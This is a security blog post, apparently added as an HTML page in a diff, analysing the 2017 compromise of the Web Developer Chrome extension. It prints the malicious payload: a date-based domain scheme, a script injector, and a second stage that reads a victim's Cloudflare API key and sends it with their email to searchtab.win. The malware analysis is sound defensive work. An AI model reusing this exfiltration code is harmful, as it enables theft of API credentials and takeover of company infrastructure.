@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta content="security, vulnhub" name="keywords">
+<meta content="Alex Flores" name="author">
+<meta property="og:title" content="Chrome Extension Steals Cloudflare Api Tokens - SecBlog">
+<meta property="og:url" content="https://sec.alexflor.es/post/chrome-extension-steals-cloudflare-api-tokens/">
+<meta property="og:description" content="Things have been OK for me except that I&#39;m a zombie now">
+<meta property="og:type" content="website" />
+<title>Chrome Extension Steals Cloudflare Api Tokens | SecBlog</title>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+<link rel="stylesheet" href="https://sec.alexflor.es//css/style.css">
+<link rel="shortcut icon" href="https://sec.alexflor.es//wave.ico">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/github.min.css">
+
+</head>
+
+<body>
+<section class="section">
+  <div class="container">
+    <nav class="nav">
+      <div class="nav-left">
+        <a class="nav-item" href="https://sec.alexflor.es/"><h1 class="title is-4">SecBlog</h1></a>
+      </div>
+      <div class="nav-right">
+        <nav class="nav-item level is-mobile">
+          
+          <a class="level-item" href="https://github.com/audibleblink" target="_blank">
+            <span class="icon">
+              <i class="fa fa-github"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="https://twitter.com/4lex" target="_blank">
+            <span class="icon">
+              <i class="fa fa-twitter"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="https://linkedin.com/in/alex2" target="_blank">
+            <span class="icon">
+              <i class="fa fa-linkedin-square"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="/index.xml" target="_blank">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+          </a>
+          
+        </nav>
+      </div>
+    </nav>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <h1 class="title">Chrome Extension Steals Cloudflare Api Tokens</h1>
+    <h2 class="subtitle is-5">August 3, 2017 by Alex Flores</h2>
+    
+    <div class="content">
+      
+
+<p>Upon receiving news that the popular Chrome Extension, Web Developer, had been compromised, I
+quickly began to wonder about the what and how.Several stroies exist about how the extension came
+to be compromised and they touched a bit on what it did. This post is meant to expand upon, what I
+believe to be, the more nefarious behavior of the extension. Since the extension calls out to an
+attacker-controlled URL, the payload hosted at that URL could be changed to <em>anything</em> at any time.</p>
+
+<p>At the time of inspection, the code checks to see if the victim is on the Cloudflare domain. If it
+is, it starts an XHR request to fetch the users&rsquo; API token and ships it, along with the victim&rsquo;s
+email address, to an attacker-controlled server.</p>
+
+<h2 id="the-code">The Code</h2>
+
+<p>The extension contains code that, upon visiting any site, generates a dynamic URL that changes
+daily. It uses an MD5 hash of the current date, using the d-m-yyyy format.</p>
+
+<pre><code class="language-text">// tomorrow's url
+https://wd + md5(4-8-2017) + .win/ga.js
+https://wdfefe6195a8b014a1cc7d9cf2449d1b50.win/ga.js
+</code></pre>
+
+<p>This payload is fetched on every page that a victim navigates to.  The payload is encoded and
+minified. Expanding it reveals the following portion:</p>
+
+<pre><code class="language-javascript.prettyprint">if (top['location']['href']['indexOf']('cloudflare.com') &gt; -1) {
+  (function () {
+    var _0xb2b9x1 = document['createElement']('script');
+    _0xb2b9x1['type'] = 'text/javascript';
+    _0xb2b9x1['src'] = '//searchtab.win/ga.js';
+    var _0xb2b9x2 = document['getElementsByTagName']('script')[0];
+    _0xb2b9x2['parentNode']['insertBefore'](_0xb2b9x1, _0xb2b9x2)
+  })()
+} else {...
+</code></pre>
+
+<p>The first-stage payload checks whether the victim is currently on cloudflare.com. If they are, it
+creates a new script tag on the page and sets its source to <code>//searchtab.win/ga.js</code>. This downloads
+stage 2 of the payload. If we look, we get the following script:</p>
+
+<pre><code class="language-javascript.prettyprint">var xmlhttp = new XMLHttpRequest();
+xmlhttp.open('GET', 'https://www.cloudflare.com/api/v4/user/api_key', true);
+xmlhttp.setRequestHeader(&quot;x-atok&quot;, window.bootstrap.atok);
+xmlhttp.onreadystatechange = function() {
+  if (xmlhttp.readyState == 4) {
+    if(xmlhttp.status == 200) {
+      var obj = JSON.parse(xmlhttp.responseText);
+      var key = obj.result.api_key;
+      console.log(key);
+      (new Image).src = '//searchtab.win/ga.php?user=' +
+        encodeURIComponent(window.bootstrap.data.user.email) + '&amp;key=' + encodeURIComponent(key);
+    }
+  }
+};
+xmlhttp.send(null);
+</code></pre>
+
+<p>This second-stage payload <code>GET</code>s the logged in user&rsquo;s API key then sends it, and the user&rsquo;s email,
+along to the <code>searchtab.win</code> domain.</p>
+
+<p>This was clearly a targetted attack against professional Web Developers. Web Developers will
+sometimes have access to production accounts on their employer&rsquo;s infrastructure. Though more common
+in smaller companies that don&rsquo;t have dedicated DevOps and/or Security teams, it&rsquo;s not impossible
+for bigger companies to fall prey.</p>
+
+<p>With a valid API token, attackers could control a company&rsquo;s public-facing infrastructture and
+create or modify sub/domains.</p>
+
+<p>We&rsquo;ve currently blocked all outgoing requests to <code>*.win/ga.js</code> and asked our developers to update
+to version 0.5 of the Web Developer extension.</p>
+
+    </div>
+    
+        <div class="nav-left">
+    <a class="nav-item" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fsec.alexflor.es%2fpost%2fchrome-extension-steals-cloudflare-api-tokens%2f" title="Share on Facebook" target="_blank"><span class="fa fa-facebook fa-2x" aria-hidden="true"></span></a>
+    <a class="nav-item" href="https://plus.google.com/share?url=https%3a%2f%2fsec.alexflor.es%2fpost%2fchrome-extension-steals-cloudflare-api-tokens%2f" title="Share on Google+" target="_blank"><span class="fa fa-google-plus fa-2x" aria-hidden="true"></span></a>
+    <a class="nav-item" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsec.alexflor.es%2fpost%2fchrome-extension-steals-cloudflare-api-tokens%2f" title="Share on LinkedIn" target="_blank"><span class="fa fa-linkedin fa-2x" aria-hidden="true"></span></a>
+    <a class="nav-item" href="https://twitter.com/home?status=Chrome%20Extension%20Steals%20Cloudflare%20Api%20Tokens - https%3a%2f%2fsec.alexflor.es%2fpost%2fchrome-extension-steals-cloudflare-api-tokens%2f" title="Tweet this" target="_blank"><span class="fa fa-twitter fa-2x"></span></a>
+    <a class="nav-item" href="http://www.reddit.com/submit?url=https%3a%2f%2fsec.alexflor.es%2fpost%2fchrome-extension-steals-cloudflare-api-tokens%2f&title=Chrome%20Extension%20Steals%20Cloudflare%20Api%20Tokens" title="Share on Reddit" target="_blank"><span class="fa fa-reddit-alien fa-2x" aria-hidden="true"></span></a>
+    
+    </div>
+    
+  </div>
+</section>
+
+
+<section class="section">
+  <div class="container has-text-centered">
+    <p>Untitled.</p>
+  </div>
+</section>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js" integrity="sha256-+bhVTaRmJ/c07eV80nU8gD2cBBF0rYkf1txqXlrbvb0=" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/go.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/dockerfile.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/javascript.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/python.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/ruby.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-12497311-8', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+
+
+</body>
